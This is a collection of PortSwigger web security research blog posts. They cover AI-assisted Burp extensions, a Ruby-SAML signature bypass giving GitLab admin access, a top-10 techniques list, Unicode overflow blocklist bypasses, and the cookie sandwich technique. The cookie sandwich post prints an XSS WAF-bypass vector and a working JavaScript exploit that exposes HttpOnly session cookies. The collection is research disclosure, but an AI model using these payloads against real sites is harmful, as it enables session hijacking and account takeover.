{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Document My Pentest: you hack, the AI writes it up!", "url": "https://portswigger.net/research/document-my-pentest", "published": "Wed, 23 Apr 2025 13:17:24 GMT", "content": "Published: 23 April 2025 at 13:17 UTC\nUpdated: 24 April 2025 at 08:41 UTC\nTired of repeating yourself? Automate your web security audit trail. In this post I'll introduce a new Burp AI extension that takes the boring bits out of your pen test.\nWeb security testing can be a grind: documenting every step, writing the same notes over and over, and repeating it all across every engagement. But what if your workflow could document itself - while you hacked?\nMeet \"Document My Pentest\", your silent co-analyst for security testing. It’s an open-source Burp Suite extension that watches your requests in real time, understands what you’re probing for, and automatically builds a clean, structured record of your findings - capturing exactly what you did and how you did it. When you’re ready, hand it off to AI and generate a report. No more boring note taking. Just results.\nThe PortSwigger research team has been exploring new AI extensions using Burp AI features , and it's surprisingly quick to get a functional prototype up and running. Within just a few days, I had a working extension.\nI quickly learned that the AI isn't very good at analysing a whole request and response, especially for vulnerabilities like XSS. It was good at spotting Path Traversal where a response gave a clear indication that it had worked because the directory listing was displayed.\nWith this in mind I began to come up with a strategy to identify reflected data. My first thought to accomplish this was to use canaries and look at where the canary is reflected but there are a couple of issues here: a) We'd need to send an extra request for every request and b) We'd have to alter the user sent request. Then I thought why don't we just use the tested input as the canary and translate it to a regular expression. It worked like this:\nConsider the input <script>alert(1)</script>\nthis can be transformed in a plethora of ways but often the alphanumeric characters will stay consistent, so I wrote an input to regex translator which transforms the input into:\n.{1,6}script.{1,6}alert.{1,6}1.{1,6}.{1,6}.{1,6}script.{1,6}\nThis would mean it would match transformations like:\n<script>alert(1)</script>\n%3Cscript%3Ealert(1)%3C%2Fscript%3E\n%253Cscript%253Ealert(1)%253C%252Fscript%253E\nThis can give the AI the exact transformation and extract a more focussed part of the reflection enabling the AI to even quote what the input was transformed to without any specific instructions. After a lot of testing this seemed to work pretty well but we quickly found that it wasn't suitable for other attacks such as Request Smuggling. In this case where parameter/header modifications couldn't be detected we decided to send the whole request and response with a different AI prompt that produced much better results.\nWhilst building this extension I often found the AI would misidentify vulnerabilities and this was due to the instructions given in the prompt. For example:\n*Note* if HTML entities are found they very rarely indicate an XSS vulnerability.\nThe problem with this prompt is that it is uncertain to the AI if it's a vulnerability or not. My thinking was that you can use entities inside \"srcdoc\" attributes to cause XSS but this vague language causes the LLM to label vulnerabilities as potential XSS even when it's HTML encoded. The solution to this is to create more precise language in the prompt:\nIf the response reflection contains HTML-encoded input (e.g., <script>\n), that is not a vulnerability.\"\nYou can even get the LLM to analyse its own response and tell you why it thinks there's a vulnerability when there clearly isn't. Here's the prompt I used:\nLook at this LLM response and point out why it thinks there's XSS when there clearly isn't:\nLLM RESPONSE GOES HERE\nThis returned detailed analysis of why the LLM was misidentifying the issue and suggested ways to improve it. Then I took the actual prompt and asked the LLM to improve it:\n\"How can I improve this prompt to prevent this kind of issue?\"\nYOUR PROMPT GOES HERE\nThe LLM gave some very precise instructions on how to improve the prompt. This produced much better analysis and reduced false positives.\nThis whole process highlighted just how important careful prompt engineering is when working with LLMs for security analysis. The underlying model can be powerful, but without clear, unambiguous instructions and tightly scoped input, it's prone to hallucinations or overly cautious responses. By iterating on prompts, experimenting with input formatting, and tuning what data the model sees, we were able to push its capabilities to find a wide range of vulnerabilities. It’s not perfect, but with the right setup, it can meaningfully assist in vulnerability triage and even explain its reasoning in ways that help refine both the AI and the human using it.\nIn Burp Suite Professional, go to Extensions → BApp store and search for \"Document My Pentest\". Click the install button and then navigate to the installed tab then select \"Document My Pentest\" and check the \"Use AI\" checkbox in the Extension tab.\nJust use Repeater like you normally would while testing a target. When you're ready to document your work, skip digging through Repeater history - simply right-click and select Extensions → Document My Pentest → Document my work. The AI will generate notes for you automatically.\nYou can also right click on the proxy history and document a pen test as separate requests or as a collection of requests and responses.\nRight-click on a single or multiple proxy history items and select Extensions → Document My Pentest→ Document my work (separately). This will create notes on each request and response as a separate attack. Extensions → Document My Pentest → Document my work (as collection) will create a combined notes on all the requests and responses and put the notes into the last selected item. You can also configure Document My Pentest to automatically send notes to the Organizer as you hack the target by going to Document My Work->Settings->Auto invoke after Repeater requests and Document My Work->Settings->Auto send notes to Organizer.\nOf course, AI isn't flawless - sometimes it gets things wrong. No problem: you can manually edit the notes and make corrections.\nFeeling inspired? Try creating an AI-powered extension yourself using Burp's built-in Montoya API and its dedicated interfaces for handling traffic between your extension and PortSwigger's trusted AI platform.\nWe've updated our docs to reflect how we handle data sent to the AI please check out the detailed documentation and the blog post.", "timestamp": "2025-10-21T13:33:06.891635"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "SAML roulette: the hacker always wins", "url": "https://portswigger.net/research/saml-roulette-the-hacker-always-wins", "published": "Tue, 18 Mar 2025 14:55:43 GMT", "content": "Published: 18 March 2025 at 14:55 UTC\nUpdated: 31 March 2025 at 07:10 UTC\nIn this post, we’ll show precisely how to chain round-trip attacks and namespace confusion to achieve unauthenticated admin access on GitLab Enterprise by exploiting the ruby-saml library.\nWhile researching this, GitHub independently discovered and patched our vulnerabilities. However, their disclosure omits key technical details, including the specific mutation and how to exploit it without authentication.\nWe believe sharing the full details on how these attacks work is crucial for improving security by empowering everyone with the knowledge needed to identify, mitigate, and defend against such threats effectively.\nThis research began after we came across a fascinating post by Juho Forsén detailing an XML round-trip vulnerability. What started as curiosity quickly spiraled into a deep dive into the intricacies of SAML, uncovering far more than we initially expected. We spent months exploring various round-trip attacks with the goal of presenting our findings at Black Hat. However, as luck would have it, we ran into a research collision with Alexander Tan ( ahacker1 ), leading to our discoveries being patched before we could submit. Despite that twist, we believe this work is still worth sharing, and while it may not be hitting Black Hat this year, we hope you find it just as compelling.\nSAML libraries often parse an XML document, store it as a string, and later re-parse it. In Ruby-SAML, this process involves two different parsers: REXML, which is used to parse the document and validate the signature, and Nokogiri, which is used to access attributes. If any mutations occur during this process, the document may not be identical when parsed a second time.\nFor secure authorization, the document must be parsed and serialized consistently; otherwise, structural inconsistencies may arise. These inconsistencies can be exploited in a round-trip attack. By leveraging XML comments and CDATA sections, an attacker can manipulate the document’s structure during mutation, bypassing signature verification and effectively gaining unauthorized access by assuming another user's identity.\nTo facilitate testing, we developed a testbed to identify round-trip vulnerabilities and efficiently evaluate multiple SAML libraries. I began by examining the document type definition (DOCTYPE), as similar vulnerabilities had been discovered in the past. My initial approach focused on analyzing how XML entities were parsed, so I conducted tests in that area.\nIn Juho's original discovery, notation declarations were used to introduce inconsistencies in how quotes were interpreted. Building on this, I investigated whether any additional vulnerabilities had been overlooked. After extensive testing, I found that mutations could be introduced within the SYSTEM identifier.\nDuring the initial parsing of the document, the first tag encountered is the original \"assertion\":\nHowever, upon re-parsing the document, the outcome changes entirely, now reflecting the attacker's \"assertion\":\nAs shown, the single-quoted system identifier is converted to double quotes. However, since the identifier contains double quotes internally, this alters the XML document’s syntax, causing the XML comment to be processed and resulting in an entirely different node. My highly skilled colleague, Zak, refined this mutation into a more streamlined and effective attack vector:\nThis vector allowed exploitation of GitLab and any other application using the Ruby-SAML library by manipulating the document and forging assertions, effectively enabling an attacker to log in as any user. However, this was only part of the attack. My colleague Zak will demonstrate how this can be escalated to achieve unauthenticated administrator access on GitLab.\nGitLab relies on the Ruby-SAML library for SAML authentication. However, to achieve unauthenticated access, we need to take a closer look at the validation process, as it plays a critical role in the attack.\nBefore a round-trip occurs, the library verifies whether the SAMLResponse contains a valid certificate embedded in the document. This is done by computing the hash of the certificate and comparing it with the fingerprint stored on the server. Later, this certificate is used to validate the signature. Keep in mind that the signature is a key aspect of this attack, as it allows for a full account takeover without access to an organization's credentials.\nOnce the certificate is extracted from the SAMLResponse, the actual signature validation process begins. First, the document is converted back to XML format from its in-memory representation. This is where Gareth's round trip attack comes into play. At this stage, the library ignores attacker assertion and proceeds to validate the signature on the original element.\nIf an attacker forges the assertion element in a way that bypasses signature validation, additional security checks come into play. The most critical checks include:\nHowever, all other validation checks operate on the attacker assertion rather than the original signed document. This allows an attacker to arbitrarily modify validation fields without breaking the signature verification process:\nOne challenge in forging a signed XML document is that XML schema validation is performed using Nokogiri with predefined schema files. This presents a limitation: for an attacker to forge a valid signed XML document, they must first obtain a document that passes XML schema validation.\nAn XML schema defines the structure of SAML XML documents, specifying:\nIn other words, the signed element must be a valid SAML protocol element—such as a login response, logout response, or metadata. You might find signed XML documents on developer forums, but that scenario is unlikely. Therefore, we will take a different approach. Instead, we introduce the Namespace confusion attack, which enables unauthenticated access to any application using Ruby-SAML.\nBefore diving into the attack, let's recall how SAML schema validation works. The Identity Provider (IdP) signs only the Signature node, not the entire assertion. Since Ruby-SAML uses two XML parsers:\nA discrepancy between these two parsers can allow us to bypass signature validation. Ruby-SAML searches for the Signature element using an XPath query:\nHere, ds refers to the XML namespace. Normally, namespaces prevent element name conflicts, but we exploit a discrepancy in how namespaces are interpreted in XPath searches.\nConsider the following scenario:\nFirst Signature element lacks a direct namespace declaration (xmlns=\"http://www.w3.org/2000/09/xmldsig#\"). Instead, we use an XML Doctype trick: Security experts often focus on !ENTITY declarations in XXE attacks, but !ATTLIST declarations can also be used for exploitation. The !ATTLIST defines the Signature element and assigns it a namespace attribute. Both REXML and Nokogiri support doctype-based namespace declarations, but REXML has a crucial flaw:\nThis allows an attacker to define two conflicting namespace attributes, where the second one overrides the first. As a result, REXML reads a FAKE digest value, while Nokogiri reads the REAL one.\nTo exploit this discrepancy:\nThis allows the attacker to bypass Ruby-SAML's Digest Validation process.\nWhile Namespace Confusion alone can exploit Ruby-SAML, it faces one limitation: REXML's poor handling of XML marshalling/unmarshalling introduces another round trip issue. Before Ruby 3.4.2, REXML truncated !ATTLIST strings in doctype declarations, making the exploit fragile. In GitLab, this breaks the attack, but a combination of both vulnerabilities can still be used:\nFirst XML parsing: REXML initially ignores the !ATTLIST value, treating it as a string literal. Second XML parsing: REXML then recognizes the !ATTLIST declaration, leading to full exploitation.\nFinding a valid signed XML document can be challenging. Fortunately, Identity Providers (IdPs) silently support Single Sign-On protocol: WS-Federation by default for every tenant. WS-Federation provides signed metadata XML endpoints, such as: https://login.microsoftonline.com/contoso.onmicrosoft.com....\nFederation metadata documents are publicly accessible to any unauthorized user—all that’s required is the application's unique ID, which can be easily extracted from the Identity Provider's URL or found using a search engine.\nWhile this metadata is not a valid SAML metadata document, a namespace confusion attack only requires a valid Signature element—one that is signed with the same certificate stored at the Service Provider. And it is.\nBy using this publicly available signed document, an attacker can:\nThis attack highlights how combining round-trip attacks with namespace confusion can lead to unauthenticated access to GitLab. The vulnerability stems from inconsistencies in how different XML parsers handle document validation, allowing an attacker to manipulate signature verification.\nTo prevent this type of attack, ensure that the same library is used for both parsing and validating signed XML documents. Avoid marshaling and unmarshaling untrusted user data. These vulnerabilities where fixed in versions 17.9.2, 17.8.5, 17.7.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).\nMake sure to follow us on X (formerly Twitter) and Bluesky, and join the official PortSwigger Discord to stay updated!", "timestamp": "2025-10-21T13:33:07.757581"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Shadow Repeater:AI-enhanced manual testing", "url": "https://portswigger.net/research/shadow-repeater-ai-enhanced-manual-testing", "published": "Thu, 20 Feb 2025 13:20:19 GMT", "content": "Published: 20 February 2025 at 13:20 UTC\nUpdated: 25 February 2025 at 09:06 UTC\nHave you ever wondered how many vulnerabilities you've missed by a hair's breadth, due to a single flawed choice?\nWe've just released Shadow Repeater, which enhances your manual testing with AI-powered, fully automatic variation testing. Simply use Burp Repeater as you normally would, and behind the scenes Shadow Repeater will monitor your attacks, try permutations, and report any discoveries via Organizer.\nShadow Repeater aids deep, targeted testing by analysing your payloads so when you have a near miss due to sending the wrong syntax, incorrect encoding, file path, or simply a typo, it can find the bug for you. It's fully automatic, and doesn't require any changes to your normal manual testing workflow.\nShadow Repeater monitors your Repeater requests and identifies which parameters you're changing. It then extracts the payloads you've placed in these parameters, and sends them to an AI model which generates variants. Finally, it attacks the target with these payload variations and uses response diffing to identify whether any of them triggered a new interesting code path. This approach allows it to build on a manual tester's expertise to uncover unexpected behaviors, such as unconventional XSS vectors, successful path traversal attempts, and even novel vulnerabilities like email splitting attacks.\nYou can get the source code for Shadow Repeater on Github and it's available on the BApp store.\nIn Burp Suite Professional, go to Extensions->BApp store and search for Shadow Repeater. Click the install button and then navigate to the installed tab then select Shadow Repeater and check the \"Use AI\" checkbox in the Extension tab.\nBy default, Shadow repeater gets invoked on the 5th repeater request you make, and it requires a parameter or header to be changed. You simply try to hack a target by altering the request in some way. In the background Shadow repeater will send variations and look for differences in the response. When it's found something interesting it will send it to the organiser for inspection.\nAt PortSwigger we had an opportunity to pitch our ideas for an AI feature in a Dragons Den style competition. I thought it wouldn't be cool if Burp could analyse Repeater requests and find variations of whatever you're testing for even unknown vulnerabilities. I failed. I couldn't see how it would work. I choose instead to focus on finding unknown encodings with AI Hackvertor.\nUsing my experience of improving AI Hackvertor, I found myself more comfortable with how the AI works, how to send user input safely and how to get responses that were actually useful. If you know me, you'll know I can't leave things alone. I once came back to exploit the AngularJS HTML filter 2 years after I originally tested it. This dragon dens idea was no exception, I came back to work on it recently.\nMy first breakthrough was to think about differences, previously I was sending entire Repeater requests to the AI for analysis and getting it to parse the request. Parsing entire requests was of course a bad idea. However, I needed this failed experiment to see what the AI was capable of. I thought about using diffing logic in a Github style diff of requests and responses. I chatted with James and he suggested using differences in parameters. So I wrote a Request Differ in Java to analyse the headers, parameters and URL path and only send the changing values to the AI. Now the AI was only analysing a small amount of data that was very focussed on what you are trying to hack.\nMy second breakthrough was instead of telling the AI to understand what is being tested, I simply told it to find variations of it. This meant giving the AI general instructions to find variations but not going to detail about what it's actually testing. This works surprisingly well: it's aware of the context thanks to the Request Differ and knows the data you're testing. It generated variations for Path Traversal, XSS and other types of vulnerabilities.\nI was successfully generating variations of what the user was testing but how do I know the variation is relevant? This is where response diffing comes into play. I borrowed the legend that is Mr Kettle as he'd done extensive work in Backslash Powered Scanner diffing logic. He gave me some code samples on how his response diffing works and I added each variation generated by the AI to the analysis list as well as the user's request and some random control values. I then looked for invariant attributes of the response that changed when a variation was sent. This gave some cool results! This technique was able to find that spaces are allowed in a XSS vector, if a path traversal vector actually works and even unknown vulnerabilities such as email splitting attacks.\nThis is just one example of what's now possible thanks to AI-powered extensions in Burp Suite. Check it out for yourself - Shadow Repeater is now available from the BApp Store for users on the Early Adopter release channel of Burp Suite Professional.\nFeeling inspired? Try creating an AI-powered extension yourself using Burp's built-in Montoya API and its dedicated interfaces for handling traffic between your extension and PortSwigger's trusted AI platform.\nWe've updated our docs to reflect how we handle data sent to the AI please check out the detailed documentation and the blog post.", "timestamp": "2025-10-21T13:33:08.579218"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Top 10 web hacking techniques of 2024", "url": "https://portswigger.net/research/top-10-web-hacking-techniques-of-2024", "published": "Tue, 04 Feb 2025 15:01:48 GMT", "content": "Published: 04 February 2025 at 15:01 UTC\nUpdated: 04 February 2025 at 15:20 UTC\nWelcome to the Top 10 Web Hacking Techniques of 2024, the 18th edition of our annual community-powered effort to identify the most innovative must-read web security research published in the last year.\nThis post is the culmination of a three-step collaboration with the security community. Over the last month:\nThis year, the community nominated a staggering 121 pieces of research - nearly double what we saw last time. To make the number of options in the community vote manageable, I filtered out entries consisting of articles published outside 2024 or outside the scope of web application security, and writeups that, while valuable, were not innovative. Even after this filter, there were 103 entries remaining!\nAfter the community vote, we were honoured to see the top fifteen included three techniques by PortSwigger Research. To avoid risking a repeat of last year, I excluded these from the panel vote. Of course, we are still very proud of them, and you can read them here:\nThe fifteen finalists from the community vote were then analyzed and voted on by an expert panel consisting of Nicolas Grégoire, Soroush Dalili, STÖK, Fabian (LiveOverflow), and myself.\nThis year, a single theme dominated the top five - you might be able to guess what it was.\nLet's begin the countdown!\nIn tenth place, Hijacking OAuth flows via Cookie Tossing by Elliot Ward introduces a novel application of the widely under-estimated Cookie Tossing technique. This research was directly inspired by an earlier post by Thomas Houhou\nBoth articles are essential reading, especially if you ever find yourself stuck with a self-XSS, or XSS in an inconsequential subdomain. Cookies predate the Same-Origin Policy that governs JavaScript, and this research shows that in spite of decades of security-bodges from HttpOnly to SameSite, they're still a hazard. Maybe it would be safer just to use localStorage for session tokens instead.\nWeb Cache Deception originally debuted at #2 in the top web hacking techniques of 2017, and has recently seen rapid development.\nIn ChatGPT Account Takeover - Wildcard Web Cache Deception, Harel introduces a twist on the technique, exploiting inconsistent decoding to perform path traversal and escape a cache rule's intended scope. We built a Web Security Academy lab based on this technique, so you can try it out for yourself.\nWe highly recommend reading all the author's writeups - they were a fundamental inspiration for our own web cache deception research.\nIn position 8, OAuth Non-Happy Path to ATO by Oxrz articulates the thought process behind a beautiful and innovative attack chain. STÖK perfectly captured why this research stands out:\nI just love how something as seemingly benign as an app honoring a manipulated \"Referer:\" header can turn into a full-blown account takeover via OAuth. This chain perfectly demonstrates how inspiration from prior research (in this case, Frans Rosén's almost legendary Dirty Dancing write-up) combined with a deep dive into the OAuth documentation can lead to some seriously creative attack chains. I had completely forgotten about this attack flow, but there’s no way I’m not automating checks for referer-based redirects whenever I’m poking at stuff from now on!\nIn seventh place, we've got... a CVE! CVE-2024-4367 - Arbitrary JavaScript execution in PDF.js to be precise. It's rare that a single, patched vulnerability makes its way into the top ten, but this finding by Thomas Rinsma is exceptional. PDF.js is widely embedded as a library, making the second-order impact both huge and difficult to predict. This research is a quality analysis of some severely overlooked attack surface, and undermines assumptions about where an attacker might get a foothold.\nIf you enjoy PDF shenanigans like this, we highly recommend reviewing publications by Alex Inführ & Ange Albertini.\nDoubleClickjacking: A New Era of UI Redressing introduces a variation on Clickjacking that bypasses pretty much every known mitigation. This entry proved controversial with the panel because it seems simple and deceptively obvious in retrospect, but still came in highly placed due to raw, undeniable value.\nWhile glimmers of this attack concept have existed for years, Paulos Yibelo delivers it with a perfect execution that proves it's unequivocally the right time for this attack. Framing restrictions and SameSite cookies have largely killed Clickjacking, and browser performance has achieved a level that makes the sleight of hand pretty much invisible. Love it, hate it, or simply hate the fact that you didn't discover it first, this is not a technique to ignore!\nHTML sanitisation has been an XSS battleground for decades, and the DOMPurify library by Cure53 has emerged as pretty much the only defensive solution that actually works.\nExploring the DOMPurify library: Bypasses and Fixes dives deep into browser HTML-parsing internals, discovering and applying novel mutation XSS (mXSS) primitives. Described by LiveOverflow as \"An absolute joy to read\" and \"Probably the most comprehensive article for understanding mXSS and how this affects sanitizers such as DOMPurify\", this is a must-read for anyone into JavaScript and XSS, and will serve as a manual for anyone looking to develop a HTML sanitisation bypass for years to come.\nAwesome work by Mizu.\nEveryone 'knows' that charset conversion is an absolute minefield, and yet somehow it's rarely seen in real exploits. In WorstFit: Unveiling Hidden Transformers in Windows ANSI, Orange Tsai and splitline prove the true power of this attack class, racking up numerous CVEs and triggering a vendor blame-game in the process. It's always a sign of great research when something that seems like it should be fundamental platform knowledge pops up and takes everyone by surprise.\nWe expect to see more discoveries in this area, and after catching this talk live at Black Hat Europe I pushed automatic detection of WorstFit-style transformations into ActiveScan++ to help out. STÖK spotted the WorstFit mapping explorer is an absolute gem for generating fuzzing wordlists, too.\nThe community's understanding of request smuggling is still rapidly evolving, and Unveiling TE.0 HTTP Request Smuggling: Discovering a Critical Vulnerability in Thousands of Google Cloud Websites is a major, must-read contribution by Paolo Arnolfo, Guillermo Gregorio, and @_medusa_1_\nThis research is personally significant for me as it taught me an important lesson. Back when I first encountered CL.0 request smuggling, I hypothesized that TE.0 could exist but that it would never be exploitable, as it would require the back-end server to accept a HTTP request starting with a number and a newline. I was very, very, wrong. Once you've mastered the fundamentals, if you want to push the boundaries, relying on prediction and analysis can hold you back. If you don't ask the question because you think you know the answer, you stay ignorant.\nIf you're wondering how the attack actually works, my best guess is that the front-end was rewriting the body as non-chunked, but forgetting to set the Content-Length header due to the OPTIONS method. This is an insane finding which opens the door to a whole lot of possibilities. Watch this space.\nSometimes you can tell research is going to be amazing just from the subtitle. LiveOverflow has a great analysis:\n\"Great research progress often happens at the intersection of fields. In Paul Gerste's SQL Injection Isn't Dead Smuggling Queries at the Protocol Level we can see binary memory corruption ideas being applied to the world of web hacking. We have an integer overflow that corrupts a size, and basically a heap-spray technique to hit a fake Query more reliably... beautiful.\"\nIt's a testament to how strong the competition was this year that this didn't grab first place.\nOrange Tsai has claimed the #1 position for the third time with Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server. This inspiring, deep and impactful research publication left the entire panel in awe. Here's what they had to say:\nOnce again, some fantastic research by Orange! It's crazy nobody considered approaching Apache in this way before! - Nicolas\nI’m certain we’re just scratching the surface of what’s possible by building on this research. Can’t wait to dig deeper, hunt for fingerprints and indicators of confusions and when the time is right, go all brrrrrr! - STÖK\nOrange Tsai treats Apache httpd like a web CTF challenge! It's incredible how deep and impactful Orange's research (always) is. Given the popularity of httpd, this research will serve as a reference for security practitioners for a long time. - LiveOverflow\nOrange is confusing all the apps! - Soroush\nThis is incredible, must-read research and absolutely deserves top place. Congratulations Orange!\nThe security community published a record-breaking amount of high-quality research in 2024, leading to intense competition for both the community and panel votes. This wasn't just a matter of quantity - this was the highest quality crop of research I've seen since picking up the top ten project in 2018, and if the trend continues next near it's going to cause carnage. With 103 nominations and only ten spots, many great writeups didn't make the cut, so be sure to check out the full nomination list and let us know what your #1 was. Also, if you spotted some exceptional research from 2024 that never got nominated, chuck me an email and I'll add it to the list.\nPart of what lands an entry in the top 10 is its expected longevity, so it's well worth getting caught up with the top ten archive too. If you're interested in getting a preview of what might win from 2025, you can subscribe to our RSS, join r/websecurityresearch, hop on our Discord, or follow us on social. If you're interested in doing this kind of research yourself, I've shared a few lessons I've learned over the years in Hunting Evasive Vulnerabilities, How to choose a security research topic, and So you want to be a web security researcher?\nMassive thanks to the panel for contributing their time and expertise to curating the final result, and thanks also to everyone who took part! Without your nominations, votes, and most-importantly research, this wouldn't be possible.\nTill next time!", "timestamp": "2025-10-21T13:33:09.450140"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Bypassing character blocklists with unicode overflows", "url": "https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows", "published": "Tue, 28 Jan 2025 13:58:28 GMT", "content": "Published: 28 January 2025 at 13:58 UTC\nUpdated: 29 January 2025 at 08:10 UTC\nUnicode codepoint truncation - also called a Unicode overflow attack - happens when a server tries to store a Unicode character in a single byte. Because the maximum value of a byte is 255, an overflow can be crafted to produce a specific ASCII character.\nHere are a couple of examples that end with 0x41 which represents A:\n0x4e41 0x4f41 0x5041 0x5141\nIf you perform a modulus operation on the code points above you'll see they produce the character \"A\":\nString.fromCodePoint(0x4e41 % 256, 0x4f41 % 256, 0x5041 % 256, 0x5141 % 256) // AAAA\nIt's not only bytes that have this problem, JavaScript itself has a codepoint overflow in the fromCharCode()\nmethod. This method allows you to generate a character between 0-0xffff but if you go above this range it will be overflowed and produce a character by the overflow amount.\nString.fromCharCode(0x10000 + 0x31, 0x10000 + 0x33, 0x10000 + 0x33, 0x10000 + 0x37)\n//1337\nThe above code uses the hex value 0x10000 which is one above the maximum codepoint supported by the fromCharCode()\nmethod. Then I add an overflow to it, in this case the hex for each codepoint of 1337. Then when the overflow occurs it produces 1337.\nThis is being actively used by bug bounty hunters and was brought to our attention by Ryan Barnett. For everyone's convenience we've added these truncation attacks to ActiveScan++, thanks to Ryan for the PR and we've created a Hackvertor tag to help reproduce the characters. Big thanks to my colleague Zak who I investigated this with. We've also updated the Shazzer unicode table to display potential unicode truncation characters.", "timestamp": "2025-10-21T13:33:10.381506"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Stealing HttpOnly cookies with the cookie sandwich technique", "url": "https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique", "published": "Wed, 22 Jan 2025 14:45:11 GMT", "content": "Published: 22 January 2025 at 14:45 UTC\nUpdated: 30 June 2025 at 16:01 UTC\nIn this post, I will introduce the \"cookie sandwich\" technique which lets you bypass the HttpOnly flag on certain servers. This research follows on from Bypassing WAFs with the phantom $Version cookie. Careful readers may have noticed that legacy cookies allow special characters to be\nincluded inside the cookie value. In this post, we're going to abuse that.\nThe cookie sandwich technique manipulates how web servers parse and handle cookies when special characters are used within them. By cleverly placing quotes and legacy cookies, an attacker can cause the server to misinterpret the structure of the cookie header, potentially exposing HttpOnly cookies to client-side scripts.\nBecause the Chrome browser doesn't support legacy cookies, it lets attackers create a cookie name that starts with a $, like $Version, from\nJavaScript. Furthermore, quotes can be placed inside any cookie value. The\nfollowing code demonstrates how to create a cookie sandwich to steal a restricted cookie value:\ndocument.cookie = `$Version=1;`;\ndocument.cookie = `param1=\"start`;\n// any cookies inside the sandwich will be placed into param1 value server-side\ndocument.cookie = `param2=end\";`;\nThe Cookie header in the request/response might appear as:\nGET / HTTP/1.1\nCookie: $Version=1; param1=\"start; sessionId=secret; param2=end\"\n=>\nHTTP/1.1 200 OK\nSet-Cookie: param1=\"start; sessionId=secret; param2=end\";\nA little reminder of how Apache Tomcat processes cookie headers:\nIf the application improperly reflects the param1 cookie in the response or does not have the HttpOnly attribute, the entire cookie string, including any HttpOnly session cookie sent by the browser between param1 and param2 - can be exposed.\nPython frameworks support quoted strings by default, eliminating the need for the special $Version attribute. These frameworks also recognize the semicolon as the browser's cookie pair separator, automatically encoding all special characters into a four-character sequence: a forward slash followed by the three-digit octal equivalent of the character. A \"cookie sandwich\" attack against a Flask application might look like this:\nGET / HTTP/1.1\nCookie: param1=\"start; sessionId=secret; param2=end\"\n=>\nHTTP/1.1 200 OK\nSet-Cookie: param1=\"start\\073 sessionId=secret\\073 param2=end\";\nAnalytics often employ cookies or URL parameters to monitor user actions, and rarely validate the tracking ID. This makes them a perfect target for the cookie sandwich attack. Typically, when a user first visits a site, the server creates a random string visitorId and stores it in cookies. This visitorId is then shown on the webpage for analytics:\n<script>\n{\"visitorId\":\"deadbeef\"}\n</script>\nThis scenario creates a vulnerability. If an attacker can access the webpage content - perhaps through a CORS request with credentials or an XSS attack on the same origin - they can bypass the HttpOnly cookie flag, exposing sensitive user information.\nIn a recent test, I encountered a vulnerable application with a reflected XSS vulnerability on an error page. Here’s how I was able to use it to steal an HttpOnly PHPSESSID cookie. The journey involved bypassing some security controls and leveraging an overlooked tracking domain vulnerability.\nThe vulnerable application reflected certain link and meta attributes without proper escaping. This allowed me to inject JavaScript code, as the server didn’t properly sanitize the user input. While AWS WAF was in place, it could be bypassed due to an unpatched event oncontentvisibilityautostatechange. Thanks to @garethheyes who helped me with that trick:\n<link rel=\"canonical\"\noncontentvisibilityautostatechange=\"alert(1)\"\nstyle=\"content-visibility:auto\">\nOnce I confirmed that I could run custom JavaScript on the page, my next objective was to locate an HttpOnly cookie associated with the domain. Initially, I didn’t find any directly accessible analytics JavaScript, but I discovered a tracking domain that reflected the session ID parameter in the JSON response body. This tracking endpoint accepted a session parameter in the URL, as shown below:\nGET /json?session=ignored HTTP/1.1\nHost: tracking.example.com\nOrigin: https://www.example.com\nReferer: https://www.example.com/\nCookie: session=deadbeef;\nHTTP/2 200 OK\nContent-Type: application/json;charset=UTF-8\nAccess-Control-Allow-Origin: https://www.example.com\nAccess-Control-Allow-Credentials: true\n{\"session\":\"deadbeef\"}\nThis website is a great candidate to use in our attack because:\nThis tracking application had an interesting behaviour: although the session URL query parameter is mandatory, the server overwrites its value with the one from the Cookie header. Since the backend runs on Apache Tomcat, I leveraged the phantom $Version cookie to switch to RFC2109 and execute a cookie sandwich attack. However, one critical challenge remained: controlling the order of cookies in the client's request. For the $Version cookie to be sent first, it must either be created earlier or have a path attribute longer than all other cookies. While we cannot control the creation time of the victim's cookie, we can manipulate the path attribute. In this case, the chosen path was /json.\nBy using a carefully crafted Cookie header, I could manipulate the order of cookies and exploit the reflection vulnerability to capture the HttpOnly PHPSESSID cookie. Here’s an example of the malicious request I used:\nGET /json?session=ignored\nHost: tracking.example.com\nOrigin: https://www.example.com\nReferer: https://www.example.com/\nCookie: $Version=1; session=\"deadbeef; PHPSESSID=secret; dummy=qaz\"\nHTTP/2 200 OK\nContent-Type: application/json;charset=UTF-8\nAccess-Control-Allow-Origin: https://www.example.com\nAccess-Control-Allow-Credentials: true\n{\"session\":\"deadbeef; PHPSESSID=secret; dummy=qaz\"}\nTo summarize, here’s the process of the attack:\nFinal exploit:\nasync function sandwich(target, cookie) {\n// Step 1: Create an iframe with target src and wait for it\nconst iframe = document.createElement('iframe');\nconst url = new URL(target);\nconst domain = url.hostname;\nconst path = url.pathname;\niframe.src = target;\n// Hide the iframe\niframe.style.display = 'none';\ndocument.body.appendChild(iframe);\n// Optional: Add your code to check and clean client's cookies if needed\niframe.onload = async () => {\n// Step 2: Create cookie gadget\ndocument.cookie = `$Version=1; domain=${domain}; path=${path};`;\ndocument.cookie = `${cookie}=\"deadbeef; domain=${domain}; path=${path};`;\ndocument.cookie = `dummy=qaz\"; domain=${domain}; path=/;`;\n// Step 3: Send a fetch request\ntry {\nconst response = await fetch(`${target}`, {\ncredentials: 'include',\n});\nconst responseData = await response.text();\n// Step 4: Alert response\nalert(responseData);\n} catch (error) {\nconsole.error('Error fetching data:', error);\n}\n};\n}\nsetTimeout(sandwich, 100, 'http://example.com/json', 'session');\nWith this method, I could get access to the other user session cookie from the JSON response, leveraging XSS, cookie manipulation, and the tracking application’s vulnerability.\nCookie security is essential for safeguarding web applications against numerous types of attacks. Pay close attention to cookie encoding and parsing behaviours. It's important to comprehend how cookies are processed by the frameworks and browsers you utilise. Note that, by default Apache Tomcat versions 8.5.x, 9.0.x and 10.0.x support the RFC2109.\nBe sure to check out our previous blog post on bypassing WAFs using the phantom $Version cookie.\nFor our latest blog posts and security insights, follow us on X (formerly 